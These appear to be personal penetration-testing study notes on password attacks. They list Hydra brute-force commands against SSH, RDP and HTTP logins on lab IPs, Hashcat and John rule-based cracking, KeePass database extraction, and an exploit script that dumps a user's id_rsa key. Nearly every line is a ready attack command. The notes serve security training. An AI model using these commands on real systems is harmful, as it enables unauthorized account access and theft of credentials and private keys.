# Password spray
## Hydra
- ssh
- ``` hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201  ```
- rdp
- ``` hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202 ```
- port 
- ``` -s ```

- care 302 redirect
- HTTP POST Form
  ``` hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid" ```
- HTTP GET
  ``` hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.152.201 http-get "/index.php" ```



## Cracking with Hashcat
- Work w/ mutated password list (rockyou/other list)
- hashcat rule explained: [https://github.com/zh54321/hashcat_rule_gen ](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
- writing rule to xx.rule ``` $1 $2 $3 c $!  ``` 
- running crack ``` hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r xx.rule --force  ```
- ``` c ``` in rule = captilized letter
- ``` u d ``` in rule = upper all char & duplicated once

- Hash mode: https://hashcat.net/wiki/doku.php?id=example_hashes
- Hash type analyzer: https://www.tunnelsup.com/hash-analyzer/ 

## Password manager 
- e.g. keepass
- Find all .kdbx database ``` Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue ```
- translate .kdbx to .hash ``` keepass2john Database.kdbx > keepass.hash ```
- trim unwanted text e.g. $database: 
- using hashcat func w/ keepass lib ``` hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force ``` 

## SSH Passphrase
- DONT GRANT TOO MUCH RIGHTS TO id_rsa | 600 is enough
- can get id_rsa , still need crack paraphase
- using ssh2john
- trim hash e.g. id_rsa:
- ``` hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force ```

**
- possible to dump thru ``` ./50383.sh target.txt /home/alfred/.ssh/id_rsa ```

## john
- if some pre-defined module not work, use john directly
- create new rule to john.conf ``` sudo sh -c 'cat /home/hoidam/Downloads/ssh.rule >> /etc/john/john.conf'```
- run it ``` john --wordlist=ssh.passwords --rules=sshRules ssh.hash ```